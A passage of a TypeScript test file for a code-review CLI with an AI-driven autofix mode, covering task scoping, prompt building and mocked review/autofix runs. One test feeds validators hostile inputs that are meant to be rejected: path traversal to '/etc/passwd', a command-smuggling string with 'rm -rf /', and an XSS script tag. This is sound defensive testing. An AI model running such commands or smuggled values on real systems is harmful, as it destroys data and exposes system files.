      const planData: PlanSchema = {
        id: 7,
        title: 'Negative Index Plan',
        goal: 'Test negative indexes',
        tasks: [{ title: 'Task One', description: 'Only task', done: false }],
      };

      // -1 is treated as invalid (not a valid 1-based index)
      expect(() =>
        resolveReviewTaskScope(planData, { taskIndex: ['-1'], taskTitle: ['Missing Task'] })
      ).toThrow('Invalid task indexes: -1; Unknown task titles: Missing Task');
    });

    test('remainingTasks excludes done tasks outside scope', () => {
      const planData: PlanSchema = {
        id: 8,
        title: 'Remaining Tasks Plan',
        goal: 'Test remaining tasks',
        tasks: [
          { title: 'Scoped Task', description: 'In scope', done: false },
          { title: 'Done Task', description: 'Already done', done: true },
          { title: 'Pending Task', description: 'Still pending', done: false },
          { title: 'Another Pending', description: 'Also pending', done: false },
        ],
      };

      const result = resolveReviewTaskScope(planData, { taskIndex: ['1'] });

      expect(result.isScoped).toBe(true);
      expect(result.planData.tasks?.map((t) => t.title)).toEqual(['Scoped Task']);
      // Done Task (index 2) should be excluded, Pending Task (3) and Another Pending (4) included
      expect(result.remainingTasks).toEqual([
        { index: 3, title: 'Pending Task' },
        { index: 4, title: 'Another Pending' },
      ]);
    });

    test('remainingTasks is empty when all non-scoped tasks are done', () => {
      const planData: PlanSchema = {
        id: 9,
        title: 'All Done Plan',
        goal: 'Test no remaining tasks',
        tasks: [
          { title: 'Scoped Task', description: 'In scope', done: false },
          { title: 'Done One', description: 'Finished', done: true },
          { title: 'Done Two', description: 'Also finished', done: true },
        ],
      };

      const result = resolveReviewTaskScope(planData, { taskIndex: ['1'] });

      expect(result.isScoped).toBe(true);
      expect(result.remainingTasks).toEqual([]);
    });
  });
});

describe('Custom review instructions', () => {
  test('validateInstructionsFilePath rejects malicious paths and accepts safe ones', () => {
    const gitRoot = '/safe/project';

    // Test path traversal protection
    expect(() => validateInstructionsFilePath('../../../etc/passwd', gitRoot)).toThrow();
    expect(() => validateInstructionsFilePath('/etc/passwd', gitRoot)).toThrow();

    // Test safe paths
    expect(() => validateInstructionsFilePath('instructions.md', gitRoot)).not.toThrow();
    expect(() => validateInstructionsFilePath('./docs/review.md', gitRoot)).not.toThrow();
  });

  test('validateFocusAreas rejects malicious input and accepts safe areas', () => {
    // Test injection protection
    expect(() => validateFocusAreas(['security; rm -rf /'])).toThrow();
    expect(() => validateFocusAreas(['performance && echo hacked'])).toThrow();
    expect(() => validateFocusAreas(['<script>alert("xss")</script>'])).toThrow();

    // Test safe focus areas
    expect(() => validateFocusAreas(['security', 'performance', 'testing'])).not.toThrow();
    expect(validateFocusAreas(['security', 'performance'])).toEqual(['security', 'performance']);

    // Test limits
    expect(() => validateFocusAreas(Array(15).fill('area'))).toThrow('Too many focus areas');
    expect(() => validateFocusAreas(['a'.repeat(100)])).toThrow('Focus area too long');
  });

  test('error messages use proper formatting instead of template literals', () => {
    // Test that our error handling fixes work correctly
    const error = new Error('Test error');
    const errorMessage = error instanceof Error ? error.message : String(error);
    expect(errorMessage).toBe('Test error');

    // Test string coercion for non-Error objects
    const nonError = { message: 'Not an error object' };
    const nonErrorMessage = nonError instanceof Error ? nonError.message : String(nonError);
    expect(nonErrorMessage).toBe('[object Object]');
  });

  test('properly handles buildReviewPrompt function signature with custom instructions', () => {
    // Test that buildReviewPrompt accepts the customInstructions parameter
    const planData = { id: 1, title: 'Test', goal: 'Test goal', tasks: [] };
    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'diff',
    };

    // This should not throw and should work with the new signature
    expect(() =>
      buildReviewPrompt(planData, diffResult, true, false, [], [], 'custom instructions')
    ).not.toThrow();
    expect(() => buildReviewPrompt(planData, diffResult, true, false, [], [])).not.toThrow();
  });

  test('buildReviewPrompt includes remaining tasks section when provided', () => {
    const planData = {
      id: 1,
      title: 'Test',
      goal: 'Test goal',
      tasks: [{ title: 'Scoped Task', description: 'In scope', done: false }],
    };
    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'diff',
    };
    const remainingTasks = [
      { index: 2, title: 'Pending Task' },
      { index: 4, title: 'Another Pending' },
    ];

    const prompt = buildReviewPrompt(
      planData,
      diffResult,
      false,
      false,
      [],
      [],
      undefined,
      'Scoped to 1 of 4 tasks',
      undefined,
      remainingTasks
    );

    expect(prompt).toContain('Remaining Unfinished Tasks');
    expect(prompt).toContain('2. Pending Task');
    expect(prompt).toContain('4. Another Pending');
    expect(prompt).toContain('not yet implemented');
  });

  test('buildReviewPrompt omits remaining tasks section when empty', () => {
    const planData = { id: 1, title: 'Test', goal: 'Test goal', tasks: [] };
    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'diff',
    };

    const prompt = buildReviewPrompt(
      planData,
      diffResult,
      false,
      false,
      [],
      [],
      undefined,
      undefined,
      undefined,
      []
    );

    expect(prompt).not.toContain('Remaining Unfinished Tasks');
  });

  test('validates function signatures work correctly after security fixes', () => {
    // Test that all our security functions work as expected
    const gitRoot = '/test/project';

    // Test validateInstructionsFilePath with various inputs
    expect(() => validateInstructionsFilePath('safe-file.md', gitRoot)).not.toThrow();
    expect(() => validateInstructionsFilePath('../unsafe', gitRoot)).toThrow();

    // Test validateFocusAreas with various inputs
    expect(() => validateFocusAreas(['safe', 'areas'])).not.toThrow();
    expect(() => validateFocusAreas(['unsafe; injection'])).toThrow();

    // Test that they return expected values for valid inputs
    const safePath = validateInstructionsFilePath('docs/instructions.md', gitRoot);
    expect(safePath).toContain('docs/instructions.md');

    const safeAreas = validateFocusAreas(['security', 'performance']);
    expect(safeAreas).toEqual(['security', 'performance']);
  });
});

describe('Autofix functionality', () => {
  test('reopens a needs_review parent after appending review issues to a reopened child', async () => {
    process.chdir(testDir);
    await writePlanToDb(
      {
        id: 300,
        title: 'Review Parent',
        goal: 'Track parent state',
        details: 'Parent details',
        status: 'needs_review',
        tasks: [],
      },
      { cwdForIdentity: testDir }
    );
    await writePlanToDb(
      {
        id: 301,
        title: 'Review Child',
        goal: 'Append review issues',
        details: 'Child details',
        status: 'needs_review',
        parent: 300,
        tasks: [],
      },
      { cwdForIdentity: testDir }
    );
    await reopenParentForAppendedReviewTasks(
      {
        parent: 300,
        status: 'needs_review',
      },
      undefined
    );

    const updatedParent = (await resolvePlanFromDb('300', testDir)).plan;
    expect(updatedParent.status).toBe('in_progress');
  });

  test('reopens a done parent after appending review issues to a reopened child', async () => {
    process.chdir(testDir);
    await writePlanToDb(
      {
        id: 302,
        title: 'Done Parent',
        goal: 'Track parent state',
        details: 'Parent details',
        status: 'done',
        tasks: [],
      },
      { cwdForIdentity: testDir }
    );
    await reopenParentForAppendedReviewTasks(
      {
        parent: 302,
        status: 'done',
      },
      undefined
    );

    const updatedParent = (await resolvePlanFromDb('302', testDir)).plan;
    expect(updatedParent.status).toBe('in_progress');
  });

  test('does not reopen the parent when the child was already in_progress', async () => {
    process.chdir(testDir);
    await writePlanToDb(
      {
        id: 303,
        title: 'In Progress Parent',
        goal: 'Track parent state',
        details: 'Parent details',
        status: 'needs_review',
        tasks: [],
      },
      { cwdForIdentity: testDir }
    );
    await reopenParentForAppendedReviewTasks(
      {
        parent: 303,
        status: 'in_progress',
      },
      undefined
    );

    const updatedParent = (await resolvePlanFromDb('303', testDir)).plan;
    expect(updatedParent.status).toBe('needs_review');
  });

  test('materializes DB-only plans before review and autofix execution', async () => {
    process.chdir(testDir);
    await writePlanToDb(
      {
        id: 123,
        title: 'DB-only Autofix Plan',
        goal: 'Verify review/autofix materialization',
        tasks: [
          {
            title: 'Fix review issues',
            description: 'Materialize before executor handoff',
          },
        ],
      },
      { cwdForIdentity: testDir }
    );

    const materializedPlanPath = join(testDir, '.tim', 'plans', '123.plan.md');

    vi.mocked(inquirerModule.confirm).mockRejectedValue(
      new Error('Confirm should not be called with --autofix flag')
    );
    vi.mocked(inquirerModule.checkbox).mockImplementation(async ({ choices }: { choices: any[] }) =>
      choices.map((choice: any) => choice.value)
    );

    const mockExecutor = {
      execute: vi.fn(async (prompt: string, metadata: any) => {
        if (metadata.executionMode === 'review') {
          expect(metadata.planFilePath).toBe(materializedPlanPath);
          return JSON.stringify({
            issues: [
              {
                severity: 'critical',
                category: 'security',
                content: 'Missing authorization check',
                file: 'src/auth.ts',
                line: '12',
                suggestion: 'Add the missing authorization guard.',
              },
            ],
            recommendations: [],
            actionItems: [],
          });
        }

        expect(metadata.executionMode).toBe('normal');
        expect(metadata.planFilePath).toBe(materializedPlanPath);
        expect(prompt).toContain('Autofix Request');
        await writePlanFile(materializedPlanPath, {
          id: 123,
          title: 'DB-only Autofix Plan',
          goal: 'Verify review/autofix materialization',
          details: 'Updated by autofix',
          tasks: [
            {
              title: 'Fix review issues',
              description: 'Materialize before executor handoff',
              done: true,
            },
          ],
        });
        return 'Autofix completed successfully';
      }),
    };

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);

    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: '123',
        planData: {
          id: 123,
          title: 'DB-only Autofix Plan',
          goal: 'Verify review/autofix materialization',
          tasks: [
            {
              title: 'Fix review issues',
              description: 'Materialize before executor handoff',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/auth.ts'],
          baseBranch: 'main',
          diffContent: 'diff content',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand('123', { autofix: true, noSave: true }, mockCommand);

    expect(mockExecutor.execute).toHaveBeenCalledTimes(2);
    expect(mockExecutor.execute.mock.calls[0]?.[1]?.planFilePath).toBe(materializedPlanPath);
    expect(mockExecutor.execute.mock.calls[1]?.[1]?.planFilePath).toBe(materializedPlanPath);
    const materializedPlan = await readPlanFile(materializedPlanPath);
    expect(materializedPlan.id).toBe(123);
    expect(materializedPlan.title).toBe('DB-only Autofix Plan');
    expect(sendNotificationSpy).toHaveBeenCalled();
    expect(
      sendNotificationSpy.mock.calls.some(
        ([, payload]) => payload?.command === 'review' && payload?.planFile === materializedPlanPath
      )
    ).toBe(true);
    const updatedPlan = (await resolvePlanFromDb('123', testDir)).plan;
    expect(updatedPlan.details).toBe('Updated by autofix');
    expect(updatedPlan.tasks?.[0]?.done).toBe(true);
  });

  test('autofix flag executes review then autofix when issues found', async () => {
    const planContent = `
id: 123
title: Test Plan with Issues
goal: Test autofix functionality
tasks:
  - title: Test task
    description: A test task that has issues
`;
    const planFile = join(testDir, 'autofix-test.yml');
    await writeFile(planFile, `---\n${planContent}---\n`);

    // Mock checkbox to return all issues when autofix flag is used
    vi.mocked(inquirerModule.confirm).mockRejectedValue(
      new Error('Confirm should not be called with --autofix flag')
    );
    vi.mocked(inquirerModule.checkbox).mockImplementation(
      async ({ choices }: { choices: any[] }) => {
        // Return all issues for autofix
        return choices.map((c: any) => c.value);
      }
    );

    const mockExecutor = {
      execute: vi.fn(async (prompt: string, metadata: any) => {
        if (metadata.executionMode === 'review') {
          // First call is the review - return JSON output with issues
          return JSON.stringify({
            issues: [
              {
                severity: 'critical',
                category: 'security',
                content: 'Security Vulnerability - Unsafe input validation',
                file: 'src/input.ts',
                line: '42',
                suggestion: 'Add proper input sanitization',
              },
              {
                severity: 'critical',
                category: 'performance',
                content: 'Performance Issue - N+1 query problem',
                file: 'src/queries.ts',
                line: '100',
                suggestion: 'Use batch queries',
              },
            ],
            recommendations: ['Fix input validation', 'Optimize database queries'],
            actionItems: [],
          });
        } else if (metadata.executionMode === 'normal') {
          // Second call is the autofix
          expect(prompt).toContain('Autofix Request');
          expect(prompt).toContain('Security Vulnerability');
          expect(prompt).toContain('Performance Issue');
          return 'Autofix completed successfully';
        }
        return 'Unexpected execution mode';
      }),
    };

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);

    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: planFile,
        planData: {
          id: 123,
          title: 'Test Plan with Issues',
          goal: 'Test autofix functionality',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task that has issues',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/test.ts'],
          baseBranch: 'main',
          diffContent: 'test diff content',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
      prompt: 'test review prompt',
    } as any);

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand(planFile, { autofix: true }, mockCommand);

    // Verify the executor was called twice: once for review, once for autofix
    expect(mockExecutor.execute).toHaveBeenCalledTimes(2);

    // Verify the first call was for review (simple mode)
    expect(mockExecutor.execute).toHaveBeenNthCalledWith(
      1,
      'test review prompt',
      expect.objectContaining({
        executionMode: 'review',
        captureOutput: 'result',
      })
    );

    // Verify the second call was for autofix (normal mode)
    expect(mockExecutor.execute).toHaveBeenNthCalledWith(
      2,
      expect.stringContaining('Autofix Request'),
      expect.objectContaining({
        executionMode: 'normal',
        captureOutput: 'none',
      })
    );
  });

  // TODO something flaky about this test
  test.skip('prompts user for autofix when issues found without autofix flag', async () => {
    const planContent = `
id: 124
title: Test Interactive Prompt
goal: Test interactive autofix prompt
tasks:
  - title: Test task
    description: A test task with issues
`;
    const planFile = join(testDir, 'interactive-test.yml');
    await writeFile(planFile, `---\n${planContent}---\n`);

    const mockExecutor = {
      execute: vi.fn(async (prompt: string, metadata: any) => {
        if (metadata.executionMode === 'review') {
          return JSON.stringify({
            issues: [
              {
                severity: 'major',
                category: 'bug',
                content: 'Code Quality - Missing error handling',
              },
            ],
            recommendations: [],
            actionItems: [],
          });
        } else if (metadata.executionMode === 'normal') {
          return 'Autofix completed';
        }
        return 'Unexpected mode';
      }),
    };

    // Mock the confirm function to return true (user confirms autofix)
    // Also mock checkbox to return all issues
    vi.mocked(inquirerModule.confirm).mockImplementation(
      async ({ message }: { message: string }) => {
        expect(message).toContain('Issues were found during review');
        expect(message).toContain('automatically fix them');
        return true;
      }
    );
    vi.mocked(inquirerModule.select).mockImplementation(async ({ choices }: { choices: any[] }) => {
      // Return first choice
      return choices[0].value;
    });
    vi.mocked(inquirerModule.checkbox).mockImplementation(
      async ({ choices }: { choices: any[] }) => {
        // Return all choices
        return choices.map((choice: any) => choice.value);
      }
    );

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    // Call without autofix flag - should prompt user and execute autofix
    await handleReviewCommand(planFile, {}, mockCommand);

    // Should execute both review and autofix
    expect(mockExecutor.execute).toHaveBeenCalledTimes(2);
  });

  test('respects user declining autofix prompt', async () => {
    const planContent = `
id: 125
title: Test Declined Autofix
goal: Test user declining autofix
tasks:
  - title: Test task
    description: A test task with issues
`;
    const planFile = join(testDir, 'decline-test.yml');
    await writeFile(planFile, `---\n${planContent}---\n`);

    const mockExecutor = {
      execute: vi.fn(async (prompt: string, metadata: any) => {
        if (metadata.executionMode === 'review') {
          return JSON.stringify({
            issues: [
              {
                severity: 'minor',
                category: 'style',
                content: 'Style - Missing documentation',
                file: 'src/utils.ts',
                line: '25',
                suggestion: 'Add JSDoc comments',
              },
            ],
            recommendations: [],
            actionItems: [],
          });
        }
        // Should not be called for autofix
        throw new Error('Autofix should not be executed when user declines');
      }),
    };

    // Mock the confirm function to return false (user declines autofix)
    // Also mock checkbox in case it's called (shouldn't be if confirm returns false)
    vi.mocked(inquirerModule.select).mockImplementation(
      async ({ message }: { message: string }) => {
        expect(message).toContain('Issues were found during review');
        return 'exit' as any;
      }
    );

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);

    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: planFile,
        planData: {
          id: 125,
          title: 'Test Declined Autofix',
          goal: 'Test user declining autofix',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task with issues',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/test.ts'],
          baseBranch: 'main',
          diffContent: 'test diff',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
      prompt: 'test review prompt',
    } as any);

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand(planFile, {}, mockCommand);

    // Should only execute review, not autofix
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
    expect(mockExecutor.execute).toHaveBeenCalledWith(
      'test review prompt',
      expect.objectContaining({
        executionMode: 'review',
      })
    );
  });

  test('no prompt or autofix when no issues found', async () => {
    const planContent = `
id: 126
title: Test No Issues
goal: Test no autofix when no issues
tasks:
  - title: Test task
    description: A clean test task
`;
    const planFile = join(testDir, 'no-issues-test.yml');
    await writeFile(planFile, `---\n${planContent}---\n`);

    const mockExecutor = {
      execute: vi.fn(async (prompt: string, metadata: any) => {
        if (metadata.executionMode === 'review') {
          // Return review output with no issues
          return JSON.stringify({
            issues: [],
            recommendations: ['Continue following current coding standards and best practices.'],
            actionItems: [],
          });
        }
        throw new Error('Autofix should not be executed when no issues found');
      }),
    };

    // Mock confirm to throw if called (it shouldn't be)
    // Also mock checkbox to throw if called (it shouldn't be)
    vi.mocked(inquirerModule.confirm).mockRejectedValue(
      new Error('Confirm should not be called when no issues found')
    );
    vi.mocked(inquirerModule.checkbox).mockRejectedValue(
      new Error('Checkbox should not be called when no issues found')
    );

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);

    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: planFile,
        planData: {
          id: 126,
          title: 'Test No Issues',
          goal: 'Test no autofix when no issues',
          tasks: [
            {
              title: 'Test task',
              description: 'A clean test task',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/test.ts'],
          baseBranch: 'main',
          diffContent: 'test diff',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
      prompt: 'test review prompt',
    } as any);

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    // Test both with and without autofix flag - should behave the same (no autofix)
    await handleReviewCommand(planFile, {}, mockCommand);
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);

    // Reset mock and test with autofix flag
    mockExecutor.execute.mockClear();
    await handleReviewCommand(planFile, { autofix: true }, mockCommand);
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
  });

  test('no-autofix flag prevents autofix even when issues found', async () => {
    const planContent = `
id: 127
title: Test No-Autofix Flag
goal: Test no-autofix flag prevention
tasks:
  - title: Test task
    description: A test task with issues
`;
    const planFile = join(testDir, 'no-autofix-test.yml');
    await writeFile(planFile, `---\n${planContent}---\n`);

    const mockExecutor = {
      execute: vi.fn(async (prompt: string, metadata: any) => {
        if (metadata.executionMode === 'review') {
          return JSON.stringify({
            issues: [
              {
                severity: 'critical',
                category: 'security',
                content: 'Security - SQL injection vulnerability',
                file: 'src/db.ts',
                line: '55',
                suggestion: 'Use parameterized queries',
              },
            ],
            recommendations: [],
            actionItems: [],
          });
        }
        throw new Error('Autofix should not be executed with --no-autofix flag');
      }),
    };

    // Mock confirm to throw if called (it shouldn't be with --no-autofix)
    // Also mock checkbox to throw if called (it shouldn't be with --no-autofix)
    vi.mocked(inquirerModule.confirm).mockRejectedValue(
      new Error('Confirm should not be called with --no-autofix flag')
    );
    vi.mocked(inquirerModule.checkbox).mockRejectedValue(
      new Error('Checkbox should not be called with --no-autofix flag')
    );

    // Short-circuit context gathering to avoid touching real git and IO
    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: planFile,
        planData: {
          id: 127,
          title: 'Test No-Autofix Flag',
          goal: 'Test no-autofix flag prevention',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task with issues',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/test.ts'],
          baseBranch: 'main',
          diffContent: 'mock diff content',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(gitModule.getCurrentCommitHash).mockResolvedValue('deadbeef');
    vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
      prompt: 'test review prompt',
    } as any);

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand(planFile, { noAutofix: true }, mockCommand);

    // Should only execute review, not autofix
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
    expect(mockExecutor.execute).toHaveBeenCalledWith(
      'test review prompt',
      expect.objectContaining({
        executionMode: 'review',
      })
    );
  });

  test('detectIssuesInReview - detects issues via totalIssues count', () => {
    const reviewResult = {
      summary: { totalIssues: 2 },
      issues: [],
    } as any;

    const result = detectIssuesInReview(reviewResult, 'Some review output');
    expect(result).toBe(true);
  });

  test('detectIssuesInReview - detects issues via issues array', () => {
    const reviewResult = {
      summary: { totalIssues: 0 },
      issues: [{ id: 'test-issue', title: 'Test Issue' }],
    } as any;

    const result = detectIssuesInReview(reviewResult, 'Some review output');
    expect(result).toBe(true);
  });

  test('detectIssuesInReview - handles null/undefined inputs safely', () => {
    expect(detectIssuesInReview(null as any, '')).toBe(false);
    expect(detectIssuesInReview(undefined as any, '')).toBe(false);
    expect(detectIssuesInReview({} as any, '')).toBe(false);
    expect(detectIssuesInReview({ summary: {} } as any, '')).toBe(false);
  });

  test('buildAutofixPrompt - validates required inputs', () => {
    const validPlanData = {
      id: 42,
      title: 'Test Plan',
      goal: 'Test goal',
      tasks: [],
    };

    const validReviewResult = {
      issues: [{ title: 'Test Issue', description: 'Test description' }],
      rawOutput: 'Test output',
    } as any;

    const validDiffResult = {
      baseBranch: 'main',
      changedFiles: ['test.ts'],
    } as any;

    // Test null planData
    expect(() => buildAutofixPrompt(null as any, validReviewResult, validDiffResult)).toThrow(
      'planData is required for autofix prompt generation'
    );

    // Test null reviewResult
    expect(() => buildAutofixPrompt(validPlanData, null as any, validDiffResult)).toThrow(
      'reviewResult is required for autofix prompt generation'
    );

    // Test null diffResult
    expect(() => buildAutofixPrompt(validPlanData, validReviewResult, null as any)).toThrow(
      'diffResult is required for autofix prompt generation'
    );

    // Test valid inputs
    expect(() =>
      buildAutofixPrompt(validPlanData, validReviewResult, validDiffResult)
    ).not.toThrow();
  });

  test('buildAutofixPrompt creates proper autofix prompt structure', async () => {
    const planData = {
      id: 42,
      title: 'Test Plan',
      goal: 'Test autofix prompt building',
      details: 'This plan tests the autofix prompt structure',
      tasks: [
        {
          title: 'Fix security issues',
          description: 'Address security vulnerabilities',
        },
        {
          title: 'Improve performance',
          description: 'Optimize slow queries',
        },
      ],
    };

    const mockReviewResult = {
      planId: '42',
      planTitle: 'Test Plan',
      reviewTimestamp: '2024-01-01T00:00:00.000Z',
      baseBranch: 'main',
      changedFiles: ['src/auth.ts', 'src/db.ts'],
      summary: {
        totalIssues: 2,
        criticalCount: 1,
        majorCount: 1,
        minorCount: 0,
        infoCount: 0,
        categoryCounts: {
          security: 1,
          performance: 1,
          bug: 0,
          style: 0,
          compliance: 0,
          testing: 0,
          other: 0,
        },
        filesReviewed: 2,
        overallRating: 'fair' as const,
      },
      issues: [
        {
          id: 'sec-001',
          severity: 'critical' as const,
          category: 'security' as const,
          content: 'SQL Injection vulnerability - User input not properly sanitized',
          file: 'src/auth.ts',
          line: 42,
          suggestion: 'Use parameterized queries',
        },
        {
          id: 'perf-001',
          severity: 'major' as const,
          category: 'performance' as const,
          content: 'N+1 query problem - Inefficient database queries in loop',
          file: 'src/db.ts',
          line: 15,
          suggestion: 'Use batch queries or eager loading',
        },
      ],
      rawOutput: 'Mock review output',
      recommendations: ['Use parameterized queries', 'Optimize database access'],
      actionItems: ['Fix SQL injection', 'Implement batch queries'],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/auth.ts', 'src/db.ts'],
      baseBranch: 'main',
      diffContent: 'mock diff content',
    };

    // Import the buildAutofixPrompt function directly for testing
    const { buildAutofixPrompt } = await import('./review.js');
    const autofixPrompt = buildAutofixPrompt(planData, mockReviewResult, diffResult);

    // Verify the prompt structure
    expect(autofixPrompt).toContain('# Autofix Request');
    expect(autofixPrompt).toContain('## Plan Context');
    expect(autofixPrompt).toContain('**Plan ID:** 42');
    expect(autofixPrompt).toContain('**Title:** Test Plan');
    expect(autofixPrompt).toContain('**Goal:** Test autofix prompt building');
    expect(autofixPrompt).toContain('**Details:**');
    expect(autofixPrompt).toContain('This plan tests the autofix prompt structure');

    // Verify tasks are included
    expect(autofixPrompt).toContain('**Tasks:**');
    expect(autofixPrompt).toContain('1. **Fix security issues**');
    expect(autofixPrompt).toContain('Address security vulnerabilities');
    expect(autofixPrompt).toContain('2. **Improve performance**');
    expect(autofixPrompt).toContain('Optimize slow queries');

    // Verify issues are included
    expect(autofixPrompt).toContain('## Review Findings');
    expect(autofixPrompt).toContain('SQL Injection vulnerability');
    expect(autofixPrompt).toContain('N+1 query problem');
    expect(autofixPrompt).toContain('src/auth.ts');
    expect(autofixPrompt).toContain('src/db.ts');
    expect(autofixPrompt).toContain('critical');
    expect(autofixPrompt).toContain('major');

    // Verify instructions are included
    expect(autofixPrompt).toContain('## Instructions');
    expect(autofixPrompt).toContain('Please fix all the issues identified in the review');
    expect(autofixPrompt).toContain('maintaining the plan requirements');
  });
});

describe('Auto-selection of branch-specific plans', () => {
  test('auto-selects a DB-backed plan from the current branch name', async () => {
    await writePlanToDb(
      {
        id: 280,
        title: 'DB-selected Plan',
        goal: 'Resolve review plan from branch name',
        tasks: [],
      },
      { cwdForIdentity: testDir }
    );

    const materializedPlanPath = join(testDir, '.tim', 'plans', '280.plan.md');
    const mockExecutor = {
      execute: vi.fn(async () =>
        JSON.stringify({
          issues: [],
          recommendations: [],
          actionItems: [],
        })
      ),
    };
    const gatherPlanContextMock = vi.fn(async (planArg: string) => {
      expect(planArg).toBe(materializedPlanPath);
      return createMockPlanContext({
        resolvedPlanFile: materializedPlanPath,
        planData: {
          id: 280,
          title: 'DB-selected Plan',
          goal: 'Resolve review plan from branch name',
          tasks: [],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/test.ts'],
          baseBranch: 'main',
          diffContent: 'test diff',
        },
      });
    });

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);
    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);
    vi.mocked(contextGatheringModule.gatherPlanContext).mockImplementation(gatherPlanContextMock);
    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(gitModule.getCurrentBranchName).mockResolvedValue('280-db-selected-plan');

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand(undefined, {}, mockCommand);

    expect(gatherPlanContextMock).toHaveBeenCalledTimes(1);
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
    expect((await readPlanFile(materializedPlanPath)).title).toBe('DB-selected Plan');
  });

  test('branch-name auto-selected DB-only plans materialize before review and autofix execution', async () => {
    process.chdir(testDir);
    await writePlanToDb(
      {
        id: 281,
        title: 'DB-only Branch Autofix Plan',
        goal: 'Verify branch-name review/autofix materialization',
        tasks: [
          {
            title: 'Fix issues from branch-selected review',
            description: 'Materialize before executor handoff',
          },
        ],
      },
      { cwdForIdentity: testDir }
    );
    const persistedPlan = (await resolvePlanFromDb('281', testDir)).plan;
    const materializedPlanPath = join(testDir, '.tim', 'plans', '281.plan.md');
    await mkdir(join(testDir, '.tim', 'plans'), { recursive: true });
    await writePlanFile(
      materializedPlanPath,
      {
        ...persistedPlan,
        details: 'Local unsynced materialized edits',
        updatedAt: '2026-03-27T10:53:00.000Z',
      },
      { skipSync: true }
    );

    vi.mocked(inquirerModule.confirm).mockRejectedValue(
      new Error('Confirm should not be called with --autofix flag')
    );
    vi.mocked(inquirerModule.checkbox).mockImplementation(async ({ choices }: { choices: any[] }) =>
